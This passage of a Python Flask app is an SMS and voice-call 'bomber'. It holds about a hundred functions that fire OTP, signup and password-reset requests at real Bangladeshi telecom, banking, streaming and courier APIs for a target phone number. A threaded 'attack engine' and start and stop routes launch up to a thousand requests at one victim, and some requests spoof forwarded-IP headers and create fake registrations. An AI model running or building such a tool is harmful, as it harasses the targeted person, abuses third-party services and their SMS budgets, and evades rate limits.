        headers=HDR(), json={'phone':n,'type':'student'}, timeout=10)

def call_09(n):  # GP OTP (flood triggers voice)
    return _s().post('https://webloginda.grameenphone.com/backend/api/v1/otp',
        headers={"User-Agent":UA(),"Content-Type":"application/x-www-form-urlencoded"},
        data={'msisdn':n}, timeout=10)

def call_10(n):
    return _s().post('https://webloginda.grameenphone.com/backend/api/v1/otp',
        headers={"User-Agent":UA(),"Content-Type":"application/x-www-form-urlencoded"},
        data={'msisdn':n,'type':'voice'}, timeout=10)

def call_11(n):  # MyGP Cinematic — triggers voice call
    return _s().post(f'https://api.mygp.cinematic.mobi/api/v1/otp/88{n}/SBENT_3GB7D',
        headers=HDR(), timeout=10)

def call_12(n):
    return _s().post(f'https://api.mygp.cinematic.mobi/api/v1/otp/88{n}/SBENT_3GB7D',
        headers=HDR({"X-Correlation-ID":RID()}), timeout=10)

def call_13(n):
    return _s().post(f'https://api.mygp.cinematic.mobi/api/v1/send-common-otp/88{n}/',
        headers=HDR(), timeout=10)

def call_14(n):  # Chorki — flood triggers voice
    return _s().post('https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web',
        headers=HDR(), json={'number':'+88'+n}, timeout=10)

def call_15(n):
    return _s().post('https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=android',
        headers=HDR(), json={'number':'+88'+n}, timeout=10)

def call_16(n):
    return _s().post('https://api-dynamic.chorki.com/v2/auth/resend-otp?country=BD&platform=web',
        headers=HDR(), json={'number':'+88'+n}, timeout=10)

def call_17(n):  # Deepto flood
    return _s().post('https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web',
        headers=HDR(), json={'number':'+88'+n}, timeout=10)

def call_18(n):
    return _s().post('https://api.deeptoplay.com/v2/auth/login?country=BD&platform=android',
        headers=HDR(), json={'number':'+88'+n}, timeout=10)

def call_19(n):  # GhooriLearning flood
    return _s().post('https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web',
        headers=HDR(), json={'mobile_no':n}, timeout=10)

def call_20(n):
    return _s().post('https://api.ghoorilearning.com/api/auth/forgot-password/otp',
        headers=HDR(), json={'mobile_no':n}, timeout=10)

def call_21(n):  # Bioscope flood
    return _s().post(f'https://www.bioscopelive.com/en/login/send-otp?phone=88{n}&operator=bd-otp',
        headers=HDR(), timeout=10)

def call_22(n):  # Toffee flood
    return _s().post('https://toffeelive.com/api/v1/auth/phone-login',
        headers=HDR({"X-Client-Type":"web"}), json={'phone_number':'+88'+n}, timeout=10)

def call_23(n):
    return _s().post('https://toffeelive.com/api/v1/auth/resend-otp',
        headers=HDR({"X-Client-Type":"web"}), json={'phone_number':'+88'+n}, timeout=10)

def call_24(n):  # RedX flood
    return _s().post('https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp',
        headers=HDR(), json={'phoneNumber':n}, timeout=10)

def call_25(n):
    return _s().post('https://api.redx.com.bd/v1/user/signup',
        headers=HDR(), json={'name':random.choice(NAMES),'phoneNumber':n,'service':'redx'}, timeout=10)

def call_26(n):  # Bikroy flood
    return _s().get(f'https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={n}',
        headers={"User-Agent":UA(),"Accept":"application/json"}, timeout=10)

def call_27(n):  # Fundesh flood
    return _s().post('https://fundesh.com.bd/api/auth/generateOTP',
        headers=HDR(), json={'msisdn':n}, timeout=10)

def call_28(n):  # AppLink flood
    return _s().post('https://applink.com.bd/appstore-v4-server/login/otp/request',
        headers=HDR(), json={'msisdn':'88'+n}, timeout=10)

def call_29(n):  # Win2Gain flood
    return _s().get(f'https://api.win2gain.com/api/Users/RequestOtp?msisdn=88{n}',
        headers=HDR(), timeout=10)

def call_30(n):  # Hishabee flood
    return _s().post(f'https://app.hishabee.business/api/V2/otp/send?mobile_number={n}',
        headers=HDR(), timeout=10)

def call_31(n):  # MCB Affiliate flood
    return _s().post('https://www.mcbaffiliate.com/Affiliate/RequestOTP',
        headers={"User-Agent":UA(),"Content-Type":"application/x-www-form-urlencoded"},
        data={'PhoneNumber':n}, timeout=10)

def call_32(n):  # Apex4U flood
    return _s().post('https://api.apex4u.com/api/auth/login',
        headers=HDR(), json={'phoneNumber':n}, timeout=10)

def call_33(n):  # Circle BD flood
    return _s().post('https://reseller.circle.com.bd/api/v2/auth/signup',
        headers=HDR(), json={'email_or_phone':'+88'+n}, timeout=10)

def call_34(n):  # Paperfly flood
    nm=random.choice(NAMES)
    return _s().post('https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php',
        headers=HDR(), json={'full_name':nm,'company_name':'TestCo','email_address':EMAILS(),'phone_number':n}, timeout=10)

def call_35(n):  # Osudpotro flood
    return _s().post('https://api.osudpotro.com/api/v1/users/send_otp',
        headers=HDR(), json={'mobile':'+88-'+n}, timeout=10)

def call_36(n):  # Sundarban flood
    return _s().post('https://api-gateway.sundarbancourierltd.com/graphql',
        headers=HDR(), json={'operationName':'CreateAccessToken','variables':{'accessTokenFilter':{'userName':n}},
        'query':'mutation CreateAccessToken($accessTokenFilter: AccessTokenInput!) { createAccessToken(accessTokenFilter: $accessTokenFilter) { message statusCode } }'}, timeout=10)

def call_37(n):  # Dhaka Bank flood
    return _s().post('https://ezybank.dhakabank.com.bd/VerifIDExt2/api/CustOnBoarding/VerifyMobileNumber',
        headers=HDR(), json={'mobileNo':n,'product_id':'250','requestChannel':'MOB'}, timeout=10)

def call_38(n):  # Easy.com.bd flood
    pw=f"Pass@{random.randint(1000,9999)}"
    return _s().post('https://core.easy.com.bd/api/v1/registration',
        headers=HDR(), json={'mobile':n,'password':pw,'password_confirmation':pw}, timeout=10)

def call_39(n):  # Roots Edu flood
    return _s().post('https://rootsedulive.com/api/auth/forget-password',
        headers={"User-Agent":UA(),"Content-Type":"application/x-www-form-urlencoded"},
        data={'phoneOrEmail':f'88{n}'}, timeout=10)

def call_40(n):  # Win2Gain resend
    return _s().get(f'https://api.win2gain.com/api/Users/RequestOtp?msisdn=88{n}&resend=true',
        headers=HDR(), timeout=10)

def call_41(n):  # Chokrojan flood
    return _s().post('https://chokrojan.com/api/v1/passenger/login/mobile',
        headers=HDR(), json={'mobile_number':n}, timeout=10)

def call_42(n):  # MotionView flood
    return _s().post('https://api.motionview.com.bd/api/send-otp-phone-signup',
        headers=HDR(), json={'phone':n}, timeout=10)

def call_43(n):  # Bioscope v2 flood
    return _s().post(f'https://www.bioscopelive.com/en/login/send-otp?phone=88{n}&operator=bd-otp',
        headers=HDR({"Referer":"https://www.bioscopelive.com/en/login"}), timeout=10)

def call_44(n):  # Chorki iOS flood
    return _s().post('https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=ios',
        headers=HDR(), json={'number':'+88'+n}, timeout=10)

def call_45(n):  # SSL Commerz flood
    return _s().post('https://sandbox.sslcommerz.com/gwprocess/v4/api.php',
        headers={"User-Agent":UA(),"Content-Type":"application/x-www-form-urlencoded"},
        data={'store_id':'testbox','store_passwd':'qwerty','total_amount':str(random.randint(10,500)),'currency':'BDT',
              'tran_id':f'TX{random.randint(10000000,99999999)}','cus_phone':n,
              'cus_name':random.choice(NAMES),'cus_email':EMAILS(),
              'success_url':'https://localhost','fail_url':'https://localhost','cancel_url':'https://localhost'}, timeout=10)

def call_46(n):  # Robi v6
    return _s().post('https://da-api.robi.com.bd/da-nll/otp/send',
        headers=HDR({"X-Correlation-ID":RID(),"X-Channel":"IOS"}), json={'msisdn':n}, timeout=10)

def call_47(n):  # Robi v7
    return _s().post('https://da-api.robi.com.bd/da-nll/otp/send',
        headers=HDR({"X-Correlation-ID":RID(),"X-Channel":"ANDROID"}), json={'msisdn':n}, timeout=10)

def call_48(n):  # Shikho teacher
    return _s().post('https://api.shikho.com/auth/v2/send/sms',
        headers=HDR({"X-User-Role":"teacher"}), json={'phone':n,'type':'teacher','auth_type':'signup'}, timeout=10)

def call_49(n):  # Bikroy v2
    return _s().get(f'https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={n}&type=register',
        headers={"User-Agent":UA(),"Accept":"application/json"}, timeout=10)

def call_50(n):  # GhooriLearning v3
    return _s().post('https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=android',
        headers=HDR({"X-App-Version":"2.5.0"}), json={'mobile_no':n}, timeout=10)

def call_51(n):
    return _s().post('https://api.ghoorilearning.com/api/auth/login/otp?_app_platform=web',
        headers=HDR(), json={'mobile_no':n}, timeout=10)

def call_52(n):
    return _s().post('https://da-api.robi.com.bd/da-nll/otp/send',
        headers=HDR({"X-Correlation-ID":RID(),"Accept-Language":"bn-BD"}), json={'msisdn':n}, timeout=10)

def call_53(n):
    return _s().post('https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web',
        headers=HDR({"X-Version":"2.0"}), json={'number':'+88'+n}, timeout=10)

def call_54(n):
    return _s().post('https://api.deeptoplay.com/v2/auth/login?country=BD&platform=ios',
        headers=HDR(), json={'number':'+88'+n}, timeout=10)

def call_55(n):
    return _s().post('https://api.shikho.com/auth/v2/send/sms',
        headers=HDR({"X-Platform":"ios"}), json={'phone':n,'type':'student','auth_type':'forgot_password'}, timeout=10)

def call_56(n):
    return _s().post('https://applink.com.bd/appstore-v4-server/login/otp/resend',
        headers=HDR(), json={'msisdn':'88'+n}, timeout=10)

def call_57(n):
    return _s().post('https://api.redx.com.bd/v1/merchant/registration/resend-otp',
        headers=HDR(), json={'phoneNumber':n}, timeout=10)

def call_58(n):
    return _s().post(f'https://app.hishabee.business/api/V2/otp/send?mobile_number={n}&resend=true',
        headers=HDR(), timeout=10)

def call_59(n):
    nm=random.choice(NAMES)
    cos=["LogiCo","FastShip","BDPost"]
    return _s().post('https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php',
        headers=HDR({"X-Forwarded-For":IP()}),
        json={'full_name':nm,'company_name':random.choice(cos),'email_address':EMAILS(),'phone_number':n}, timeout=10)

def call_60(n):
    return _s().post('https://api.apex4u.com/api/auth/register',
        headers=HDR(), json={'phoneNumber':n,'name':random.choice(NAMES)}, timeout=10)

def call_61(n):
    return _s().post('https://fundesh.com.bd/api/auth/resendOTP',
        headers=HDR(), json={'msisdn':n}, timeout=10)

def call_62(n):
    return _s().post(f'https://www.bioscopelive.com/en/login/resend-otp?phone=88{n}',
        headers=HDR(), timeout=10)

def call_63(n):
    return _s().post('https://api.redx.com.bd/v1/user/signup',
        headers=HDR({"X-Client-Platform":"mobile"}), json={'name':random.choice(NAMES),'phoneNumber':n,'service':'redx'}, timeout=10)

def call_64(n):
    return _s().post('https://chokrojan.com/api/v1/driver/login/mobile',
        headers=HDR(), json={'mobile_number':n}, timeout=10)

def call_65(n):
    pw=f"Test{random.randint(1000,9999)}!"
    return _s().post('https://core.easy.com.bd/api/v1/registration',
        headers=HDR({"X-App-Version":"3.0.0"}), json={'mobile':n,'password':pw,'password_confirmation':pw}, timeout=10)

def call_66(n):
    return _s().post('https://api.osudpotro.com/api/v2/users/otp',
        headers=HDR(), json={'mobile':'+88-'+n,'type':'register'}, timeout=10)

def call_67(n):
    return _s().get(f'https://api.win2gain.com/api/Users/ResendOtp?msisdn=88{n}',
        headers=HDR(), timeout=10)

def call_68(n):
    return _s().post('https://api-gateway.sundarbancourierltd.com/graphql',
        headers=HDR({"X-Request-ID":f"gql-{random.randint(1000000,9999999)}"}),
        json={'operationName':'CreateAccessToken','variables':{'accessTokenFilter':{'userName':n}},
        'query':'mutation CreateAccessToken($accessTokenFilter: AccessTokenInput!) { createAccessToken(accessTokenFilter: $accessTokenFilter) { message statusCode } }'}, timeout=10)

def call_69(n):
    return _s().post('https://ezybank.dhakabank.com.bd/VerifIDExt2/api/CustOnBoarding/VerifyMobileNumber',
        headers=HDR({"X-Request-Channel":"MOBILE"}), json={'mobileNo':n,'product_id':'300','requestChannel':'MOB'}, timeout=10)

def call_70(n):
    return _s().post('https://toffeelive.com/api/v1/auth/phone-login',
        headers=HDR({"X-Client-Type":"android","X-App-Version":"5.2.1"}), json={'phone_number':'+88'+n}, timeout=10)

def call_71(n):
    return _s().post('https://reseller.circle.com.bd/api/v2/auth/signup',
        headers=HDR({"X-Platform":"web","X-App-Version":"2.0"}), json={'email_or_phone':'+88'+n}, timeout=10)

def call_72(n):
    return _s().post('https://www.mcbaffiliate.com/Affiliate/ResendOTP',
        headers={"User-Agent":UA(),"Content-Type":"application/x-www-form-urlencoded"},
        data={'PhoneNumber':n}, timeout=10)

def call_73(n):
    return _s().post('https://api.motionview.com.bd/api/send-otp-phone-login',
        headers=HDR(), json={'phone':n}, timeout=10)

def call_74(n):
    return _s().post('https://api.shikho.com/auth/v2/send/sms',
        headers=HDR({"X-Platform":"web","X-App-Version":"4.0.0"}),
        json={'phone':n,'type':'student','auth_type':'signup'}, timeout=10)

def call_75(n):
    return _s().post(f'https://api.mygp.cinematic.mobi/api/v1/otp/88{n}/SBENT_3GB7D',
        headers=HDR({"X-Correlation-ID":f"vid-{random.randint(1000000,9999999)}"}), timeout=10)

def call_76(n):
    return _s().post('https://da-api.robi.com.bd/da-nll/otp/send',
        headers=HDR({"X-Correlation-ID":RID(),"X-App-Version":"5.0.0"}), json={'msisdn':n}, timeout=10)

def call_77(n):
    return _s().post('https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=android',
        headers=HDR({"X-App-Platform":"android","X-Build-Number":"120"}), json={'number':'+88'+n}, timeout=10)

def call_78(n):
    nm=random.choice(NAMES)
    return _s().post('https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php',
        headers=HDR({"X-Forwarded-For":IP(),"X-Real-IP":IP()}),
        json={'full_name':nm,'company_name':f'Express{random.randint(1,99)}','email_address':EMAILS(),'phone_number':n}, timeout=10)

def call_79(n):
    return _s().post('https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=ios',
        headers=HDR({"X-App-Version":"3.0.0","X-Device":"iPad"}), json={'mobile_no':n}, timeout=10)

def call_80(n):
    return _s().post('https://api.apex4u.com/api/auth/resend-otp',
        headers=HDR(), json={'phoneNumber':n}, timeout=10)

def call_81(n):
    return _s().post('https://api.deeptoplay.com/v2/auth/resend-otp?country=BD&platform=android',
        headers=HDR(), json={'number':'+88'+n}, timeout=10)

def call_82(n):
    return _s().post('https://fundesh.com.bd/api/auth/generateOTP',
        headers=HDR({"X-Client-Platform":"ios","X-App-Build":"200"}), json={'msisdn':n}, timeout=10)

def call_83(n):
    return _s().post('https://api.win2gain.com/api/Users/RequestOtp',
        headers=HDR(), json={'msisdn':f'88{n}'}, timeout=10)

def call_84(n):
    return _s().get(f'https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={n}&source=app',
        headers={"User-Agent":UA(),"Accept":"application/json"}, timeout=10)

def call_85(n):
    return _s().post('https://api.osudpotro.com/api/v1/users/send_otp',
        headers=HDR({"X-Api-Version":"3","X-Platform":"ios"}), json={'mobile':'+88-'+n}, timeout=10)

def call_86(n):
    return _s().post('https://chokrojan.com/api/v1/passenger/login/mobile',
        headers=HDR({"X-Request-ID":str(random.randint(10000000,99999999))}), json={'mobile_number':n}, timeout=10)

def call_87(n):
    return _s().post('https://www.mcbaffiliate.com/Affiliate/RequestOTP',
        headers={"User-Agent":UA(),"Content-Type":"application/x-www-form-urlencoded","X-Requested-With":"XMLHttpRequest"},
        data={'PhoneNumber':n,'IsMobile':'true'}, timeout=10)

def call_88(n):
    return _s().post(f'https://app.hishabee.business/api/V2/otp/send?mobile_number={n}&channel=sms',
        headers=HDR(), timeout=10)

def call_89(n):
    return _s().post('https://rootsedulive.com/api/auth/forget-password',
        headers={"User-Agent":UA(),"Content-Type":"application/x-www-form-urlencoded"},
        data={'phoneOrEmail':'+88'+n}, timeout=10)

def call_90(n):
    return _s().post('https://reseller.circle.com.bd/api/v2/auth/send-otp',
        headers=HDR(), json={'phone':'+88'+n}, timeout=10)

def call_91(n):
    return _s().post('https://sandbox.sslcommerz.com/gwprocess/v4/api.php',
        headers={"User-Agent":UA(),"Content-Type":"application/x-www-form-urlencoded"},
        data={'store_id':'testbox','store_passwd':'qwerty','total_amount':str(random.randint(10,100)),'currency':'BDT',
              'tran_id':f'CL{random.randint(10000000,99999999)}','cus_phone':n,
              'cus_name':random.choice(NAMES),'cus_email':EMAILS(),
              'success_url':'https://localhost','fail_url':'https://localhost','cancel_url':'https://localhost'}, timeout=10)

def call_92(n):
    return _s().post('https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp',
        headers=HDR({"X-App-Version":"3.0.0","X-Platform":"ios"}), json={'phoneNumber':n}, timeout=10)

def call_93(n):
    return _s().post('https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=ios',
        headers=HDR({"X-Os":"ios","X-App-Version":"3.2.0"}), json={'number':'+88'+n}, timeout=10)

def call_94(n):
    return _s().post('https://api.shikho.com/auth/v2/send/sms',
        headers=HDR({"X-Client":"ios","X-Version":"6.0"}),
        json={'phone':n,'type':'student','auth_type':'login'}, timeout=10)

def call_95(n):
    return _s().post('https://da-api.robi.com.bd/da-nll/otp/send',
        headers=HDR({"X-Correlation-ID":RID(),"X-Otp-Type":"SMS"}), json={'msisdn':n}, timeout=10)

def call_96(n):
    return _s().post('https://ezybank.dhakabank.com.bd/VerifIDExt2/api/CustOnBoarding/VerifyMobileNumber',
        headers=HDR({"X-Channel":"IOS","X-Version":"2.0"}), json={'mobileNo':n,'product_id':'400','requestChannel':'MOB'}, timeout=10)

def call_97(n):
    return _s().post(f'https://www.bioscopelive.com/en/login/send-otp?phone=88{n}&operator=bd-otp&platform=ios',
        headers=HDR(), timeout=10)

def call_98(n):
    return _s().post('https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web',
        headers=HDR({"X-Version":"3.0","X-Correlation-ID":RID()}), json={'mobile_no':n}, timeout=10)

def call_99(n):
    return _s().post('https://applink.com.bd/appstore-v4-server/login/otp/request',
        headers=HDR({"X-App-Version":"4.1.0","X-Platform":"ios"}), json={'msisdn':'88'+n}, timeout=10)

def call_100(n):
    return _s().post('https://api.mygp.cinematic.mobi/api/v1/send-common-otp/88'+n+'/',
        headers=HDR({"X-Correlation-ID":RID(),"X-Channel":"IOS"}), timeout=10)

# ── API REGISTRY ───────────────────────────────────────────────
SMS_APIS  = [globals()[f'sms_{str(i).zfill(2)}']  for i in range(1, 121)]
CALL_APIS = [globals()[f'call_{str(i).zfill(2)}'] for i in range(1, 101)]
ALL_APIS  = SMS_APIS + CALL_APIS

# ── ATTACK ENGINE ──────────────────────────────────────────────
def _pick_api(mode):
    if mode == 'call':
        return random.choice(CALL_APIS)
    return random.choice(SMS_APIS)

def _do_request(n, mode):
    if not state.active: return
    api = _pick_api(mode)
    name = api.__name__
    try:
        r = api(n)
        state.sent += 1
        if r is not None and r.status_code in (200, 201, 202):
            state.success += 1
            state.logs.insert(0, f"STRIKE: [{name}] → HTTP {r.status_code} ✓")
        else:
            code = r.status_code if r else '---'
            state.logs.insert(0, f"MISS: [{name}] → HTTP {code}")
    except requests.Timeout:
        state.sent += 1
        state.logs.insert(0, f"FAIL: [{name}] → Timeout")
    except Exception as e:
        state.sent += 1
        state.logs.insert(0, f"FAIL: [{name}] → {type(e).__name__}")
    if len(state.logs) > 50:
        state.logs.pop()

def attack_worker(number, count, delay_ms, mode):
    state.active=True; state.target=number; state.mode=mode
    state.total=count; state.sent=0; state.success=0
    state.logs=[f"SYSTEM: Launching {mode.upper()} attack → {number} × {count}"]
    with ThreadPoolExecutor(max_workers=10) as ex:
        for _ in range(count):
            if not state.active: break
            ex.submit(_do_request, number, mode)
            time.sleep(max(0.03, delay_ms/1000.0))
    state.logs.insert(0, f"SYSTEM: Done — {state.success}/{state.sent} successful")
    state.active = False

# ── FLASK ROUTES ───────────────────────────────────────────────
@app.route('/')
def home(): return render_template('index.html')

@app.route('/start', methods=['POST'])
def start():
    d = request.get_json(force=True)
    if state.active:
        return jsonify({"status":"already_running"})
    threading.Thread(target=attack_worker,
        args=(str(d.get('num','')).strip(), min(int(d.get('count',50)),1000),
              int(d.get('delay',100)), str(d.get('mode','sms')).lower()),
        daemon=True).start()
    return jsonify({"status":"launched"})

@app.route('/stop', methods=['POST'])
def stop():
    state.active=False
    return jsonify({"status":"terminated"})

@app.route('/status')
def status():
    return jsonify({"active":state.active,"sent":state.sent,"total":state.total,
                    "success":state.success,"logs":state.logs,"target":state.target,"mode":state.mode})

@app.route('/health')
def health():
    return jsonify({"status":"ok","version":"6.0","sms_apis":len(SMS_APIS),"call_apis":len(CALL_APIS)})

@app.route('/static/<path:filename>')
def static_files(filename):
    return app.send_static_file(filename)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
